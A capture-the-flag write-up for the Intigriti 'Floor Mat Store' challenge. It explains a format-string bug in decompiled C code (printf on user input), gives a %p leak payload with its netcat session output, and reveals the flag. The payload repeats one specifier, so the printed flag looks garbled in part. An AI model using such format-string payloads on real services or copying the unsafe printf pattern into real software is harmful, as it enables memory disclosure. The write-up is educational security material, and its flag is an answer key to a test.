## **Floor Mat Store**
### Description
<sup>Author: CryptoCat</sup><br>
Welcome to the Floor Mat store! It's kind of like heaven.. for mats

`floormats.ctf.intigriti.io 1337`<br>
[floormats](./floormats)
### Solution
This challenge give us `ELF 64-bit` file.
```bash
$ file floormats   
floormats: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=386aa1493b9103743d0ce9091badfa29d656245e, for GNU/Linux 3.2.0, not stripped
```

I used ghidra to decompile the program. [Decompiled source code - floormats](#decompiled-source-code---floormats)<br>
There is a secret mat `6. Mysterious Flag Mat - $1337` at line 26.<br>
According to the [Decompiled source code - floormats](#decompiled-source-code---floormats), If the first input is `6`, the program will read `flag.txt` and put it in `local_d8` variable.<br>
At line 56, There is a **format string vuln** `printf(local_98);` because It call printf() without specific a type of the varible. So If we input something like this `%p` -> `printf(%p);` the program will bring something in memory.

The idea to read the flag is
1. input `6` then the program will load content of `flag.txt` in memory.
2. input many `%p` and hope the program will leak the flag.

After a while I found that first location of the flag `%18$p` <br>
payload:  `%23$p %22$p %22$p %21$p %20$p %19$p %18$p`

```bash
$ nc floormats.ctf.intigriti.io 1337
Welcome to the Floor Mat store! It's kind of like heaven.. for mats.

Please choose from our currently available floor mats

Note: Out of stock items have been temporarily delisted

Please select a floor mat:

1. Cozy Carpet Mat - $10
2. Wooden Plank Mat - $15
3. Fuzzy Shag Mat - $20
4. Rubberized Mat - $12
5. Luxury Velvet Mat - $25

Enter your choice:
6

Please enter your shipping address:
%23$p %22$p %22$p %21$p %20$p %19$p %18$p

Your floor mat will be shipped to:

0x7d66376e3172 0x705f37753062345f 0x705f37753062345f 0x6e7234775f793368 0x375f7968775f3537 0x3468375f30357b49 0x5449524749544e49
```

```
0x7d66376e3172 0x705f37753062345f 0x705f37753062345f 0x6e7234775f793368 0x375f7968775f3537 0x3468375f30357b49 0x5449524749544e49
```
Decode these hex and reverse them. then get the flag. 
[CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Reverse('Character')&input=MHg3ZDY2Mzc2ZTMxNzIgMHg3MDVmMzc3NTMwNjIzNDVmIDB4NzA1ZjM3NzUzMDYyMzQ1ZiAweDZlNzIzNDc3NWY3OTMzNjggMHgzNzVmNzk2ODc3NWYzNTM3IDB4MzQ2ODM3NWYzMDM1N2I0OSAweDU0NDk1MjQ3NDk1NDRlNDk)

> Flag: INTIGRITI{50_7h475_why_7h3y_w4rn_4b0u7_p_4b0u7_pr1n7f}
{: .prompt-tip }

#### Decompiled source code - floormats
```c
undefined8 main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  int local_128;
  int local_124;
  __gid_t local_120;
  int local_11c;
  char *local_118;
  FILE *local_110;
  char *local_108 [4];
  char *local_e8;
  char *local_e0;
  char local_d8 [64];
  char local_98 [136];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  local_108[0] = "1. Cozy Carpet Mat - $10";
  local_108[1] = "2. Wooden Plank Mat - $15";
  local_108[2] = "3. Fuzzy Shag Mat - $20";
  local_108[3] = "4. Rubberized Mat - $12";
  local_e8 = "5. Luxury Velvet Mat - $25";
  local_e0 = "6. Mysterious Flag Mat - $1337";
  local_118 = local_d8;
  local_120 = getegid();
  setresgid(local_120,local_120,local_120);
  local_110 = fopen("flag.txt","r");
  if (local_110 == (FILE *)0x0) {
    puts("You have a flag.txt, right??");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts(
      "Welcome to the Floor Mat store! It\'s kind of like heaven.. for mats.\n\nPlease choose from o ur currently available floor mats\n\nNote: Out of stock items have been temporarily delisted\n "
      );
  puts("Please select a floor mat:\n");
  for (local_124 = 0; local_124 < 5; local_124 = local_124 + 1) {
    puts(local_108[local_124]);
  }
  puts("\nEnter your choice:");
  __isoc99_scanf(&DAT_001021b6,&local_128);
  if ((0 < local_128) && (local_128 < 7)) {
    local_11c = local_128 + -1;
    do {
      iVar1 = getchar();
    } while (iVar1 != 10);
    if (local_11c == 5) {
      fgets(local_d8,0x40,local_110);
    }
    puts("\nPlease enter your shipping address:");
    fgets(local_98,0x80,stdin);
    puts("\nYour floor mat will be shipped to:\n");
    printf(local_98);
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return 0;
  }
  puts("Invalid choice!\n");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```
